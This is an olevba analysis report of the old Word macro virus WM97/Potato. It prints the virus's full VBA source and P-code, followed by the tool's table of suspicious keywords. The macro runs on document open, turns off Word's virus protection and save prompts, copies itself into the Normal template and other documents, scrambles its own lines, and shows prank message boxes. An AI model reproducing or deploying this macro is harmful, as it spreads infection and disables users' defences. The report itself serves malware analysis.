olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.dv
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.dv - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Randomize
u = 0
q = 0

On Error GoTo 11
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False

pt = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.countoflines
tp = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.countoflines
If tp > 0 And pt > 0 Then GoTo 11
If tp = 0 Then
    
    Set Potato = NormalTemplate.VBProject.VBComponents
    Set cake = ActiveDocument.VBProject.VBComponents
    it = Int(Rnd(1) * 20) + 1
If it = 17 Then
    
    rx = Int(Rnd(1) * 10) + 1
    If rx = 9 Then GoTo 22
    MsgBox "Do you want fries with that??", vbInformation, ":)"
    MsgBox "Ummm....I think you have a " & Chr(86) & Chr(73) & Chr(82) & Chr(85) & Chr(83) & " !!!", vbCritical, "Problem With Word :("
    
    MsgBox "Do you have an Anti-Virus", vbYesNo, "Anti-Virus"
    MsgBox "Have you paid your VISA recently", vbYesNoCancel, "Visa Payment made ?"
    MsgBox "This is fun, isn't it??", vbInformation, "This is fun!!"
    MsgBox "WM97/Potato" & vbCrLf & "(C) 1998 VEiN [SOS]" & vbCrLf & "Thanks goes to Webmaster V for all his help :)", vbInformation, "WM97/Potato"
    
    MsgBox "Word doesn't feel well" & vbCrLf & "It says it wants to rest", vbCritical, "Word is SICK!!!"
    Application.Quit
End If
If pt = 0 Then
    
    Set Potato = Active.Document.VBProject.VBComponents
    Potato.Item(1).codemodule.AddFromFile Application.StartupPath & "Potato"
With Potato.Item(1).codemodule
For e = 1 To 4

.deletelines 1
Next e
End With
If tp > 0 And pt = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

With Potato.Item(1).codemodule
    For e = 5 To Potato.Item(1).codemodule.countoflines Step 5
        u = Int(Rnd(109934) * 235514) + 5911
        q = Int(Rnd(446234) * 664320) + 9813
        
        .replaceline e, "'" & u * u & q * q & q * u & u * u & u * q
    Next e
End With
GoTo 11

22:
    cake.Item(1).Name = Potato.Item(1).Name
    cake.Item(1).Export Application.StartupPath & "Potato"
    Return

11:
If tp <> 0 And pt = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
Sub ViewVBCode()

'WM97/Potato by VEiN Quiero una hamburguesa :)
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Class.dv
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 4735 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	ArgsCall Read 0x0000 
' Line #2:
' 	LitDI2 0x0000 
' 	St u 
' Line #3:
' 	LitDI2 0x0000 
' 	St q 
' Line #4:
' Line #5:
' 	OnError 11 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #9:
' Line #10:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St pt 
' Line #11:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St tp 
' Line #12:
' 	Ld tp 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld pt 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo 11 
' 	EndIf 
' Line #13:
' 	Ld tp 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #14:
' Line #15:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set Potato 
' Line #16:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set cake 
' Line #17:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0014 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St it 
' Line #18:
' 	Ld it 
' 	LitDI2 0x0011 
' 	Eq 
' 	IfBlock 
' Line #19:
' Line #20:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St rx 
' Line #21:
' 	Ld rx 
' 	LitDI2 0x0009 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo 22 
' 	EndIf 
' Line #22:
' 	LitStr 0x001D "Do you want fries with that??"
' 	Ld vbInformation 
' 	LitStr 0x0002 ":)"
' 	ArgsCall MsgBox 0x0003 
' Line #23:
' 	LitStr 0x001B "Ummm....I think you have a "
' 	LitDI2 0x0056 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0049 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0055 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0004 " !!!"
' 	Concat 
' 	Ld vbCritical 
' 	LitStr 0x0014 "Problem With Word :("
' 	ArgsCall MsgBox 0x0003 
' Line #24:
' Line #25:
' 	LitStr 0x0019 "Do you have an Anti-Virus"
' 	Ld vbYesNo 
' 	LitStr 0x000A "Anti-Virus"
' 	ArgsCall MsgBox 0x0003 
' Line #26:
' 	LitStr 0x0020 "Have you paid your VISA recently"
' 	Ld vbYesNoCancel 
' 	LitStr 0x0013 "Visa Payment made ?"
' 	ArgsCall MsgBox 0x0003 
' Line #27:
' 	LitStr 0x0017 "This is fun, isn't it??"
' 	Ld vbInformation 
' 	LitStr 0x000D "This is fun!!"
' 	ArgsCall MsgBox 0x0003 
' Line #28:
' 	LitStr 0x000B "WM97/Potato"
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x0013 "(C) 1998 VEiN [SOS]"
' 	Concat 
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x002E "Thanks goes to Webmaster V for all his help :)"
' 	Concat 
' 	Ld vbInformation 
' 	LitStr 0x000B "WM97/Potato"
' 	ArgsCall MsgBox 0x0003 
' Line #29:
' Line #30:
' 	LitStr 0x0016 "Word doesn't feel well"
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x0018 "It says it wants to rest"
' 	Concat 
' 	Ld vbCritical 
' 	LitStr 0x000F "Word is SICK!!!"
' 	ArgsCall MsgBox 0x0003 
' Line #31:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #32:
' 	EndIfBlock 
' Line #33:
' 	Ld pt 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #34:
' Line #35:
' 	SetStmt 
' 	Ld Active 
' 	MemLd Document 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set Potato 
' Line #36:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0006 "Potato"
' 	Concat 
' 	LitDI2 0x0001 
' 	Ld Potato 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #37:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld Potato 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	With 
' Line #38:
' 	StartForVariable 
' 	Ld e 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #39:
' Line #40:
' 	LitDI2 0x0001 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #41:
' 	StartForVariable 
' 	Ld e 
' 	EndForVariable 
' 	NextVar 
' Line #42:
' 	EndWith 
' Line #43:
' 	Ld tp 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld pt 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #44:
' Line #45:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld Potato 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	With 
' Line #46:
' 	StartForVariable 
' 	Ld e 
' 	EndForVariable 
' 	LitDI2 0x0005 
' 	LitDI2 0x0001 
' 	Ld Potato 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	LitDI2 0x0005 
' 	ForStep 
' Line #47:
' 	LitDI4 0xAD6E 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI4 0x97FA 0x0003 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x1717 
' 	Add 
' 	St u 
' Line #48:
' 	LitDI4 0xCF1A 0x0006 
' 	ArgsLd Rnd 0x0001 
' 	LitDI4 0x2300 0x000A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x2655 
' 	Add 
' 	St q 
' Line #49:
' Line #50:
' 	Ld e 
' 	LitStr 0x0001 "'"
' 	Ld u 
' 	Ld u 
' 	Mul 
' 	Concat 
' 	Ld q 
' 	Ld q 
' 	Mul 
' 	Concat 
' 	Ld q 
' 	Ld u 
' 	Mul 
' 	Concat 
' 	Ld u 
' 	Ld u 
' 	Mul 
' 	Concat 
' 	Ld u 
' 	Ld q 
' 	Mul 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #51:
' 	StartForVariable 
' 	Ld e 
' 	EndForVariable 
' 	NextVar 
' Line #52:
' 	EndWith 
' Line #53:
' 	GoTo 11 
' Line #54:
' Line #55:
' 	LineNum 22 
' 	BoS 0x0000 
' Line #56:
' 	LitDI2 0x0001 
' 	Ld Potato 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	Ld cake 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #57:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0006 "Potato"
' 	Concat 
' 	LitDI2 0x0001 
' 	Ld cake 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #58:
' 	Return 
' Line #59:
' Line #60:
' 	LineNum 11 
' 	BoS 0x0000 
' Line #61:
' 	Ld tp 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld pt 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #62:
' 	EndSub 
' Line #63:
' 	FuncDefn (Sub ViewVBCode())
' Line #64:
' Line #65:
' 	QuoteRem 0x0000 0x002D "WM97/Potato by VEiN Quiero una hamburguesa :)"
' Line #66:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |MSWord.Class        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

